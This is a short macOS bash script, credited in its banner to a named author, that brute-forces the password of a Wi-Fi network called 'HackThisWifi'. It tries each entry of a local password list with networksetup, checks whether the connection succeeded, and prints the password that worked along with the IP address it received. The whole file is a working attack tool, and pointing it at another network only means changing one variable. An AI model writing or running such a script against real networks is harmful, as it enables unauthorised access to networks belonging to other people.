#!/bin/bash

password_file="./passwords.txt"
ssid="HackThisWifi"

RED="\033[1;31m"
ENDCOLOR="\033[0m"
GREEN="\033[32m"
YELLOW="\033[33m"
UNDERLINED="\033[1;4m"

echo "BruteForce Script V1 by PatrickMcCanna (https://github.com/CaptainMcCrank)"
echo -e "${UNDERLINED}Launching bruteforce attempt at $ssid${ENDCOLOR}"
echo

if [ -f $password_file ]; then
  # Loop through each line in the file and attempt to connect to the Wi-Fi network
  while read password; do
    echo "***************************************************"
    echo "Trying password: $password"
    echo "***************************************************"
    networksetup -setairportnetwork en0 $ssid $password > /dev/null

    # we can prove that we connected by checking what network we're attached to 
    output=`networksetup -getairportnetwork en0 | awk -F": " '{print $2}'`


    currentIP=`ifconfig en0 | grep "inet " | awk '{print $2}'`

    if [[ $output == "HackThisWifi" ]]; then
        echo -e "${GREEN}SUCCESS!${ENDCOLOR}"
        echo -e "${YELLOW}SUCCESS!${ENDCOLOR}"
        echo -e "${UNDERLINED}$password was the password!${ENDCOLOR}"
        echo "$currentIP is your IP."
        exit 0
    else
        echo -e "${RED}Failed to connect${ENDCOLOR}"
    fi

  done < $password_file
else
  echo "Could not find file $password_file"
fi


